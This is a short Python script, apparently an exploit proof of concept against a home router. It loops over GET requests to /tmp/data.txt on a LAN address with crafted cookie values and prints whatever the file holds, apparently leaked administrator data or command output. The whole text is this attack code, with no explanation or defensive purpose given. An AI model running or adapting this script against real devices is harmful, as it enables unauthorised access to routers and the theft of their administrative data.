import requests

router_ip = '192.168.10.1'

while True:
    cookie = {
        'language':'en',
        'xu_cookie':'xxx_look',
        'xu2_cookie':'xx_look2'
    }

    get_admin = requests.get("http://"+router_ip+"/tmp/data.txt?_=",cookies = cookie)
    if len(get_admin.text) > 5:
        print(get_admin.text.replace("\n","%0A").replace(" ","%20"))
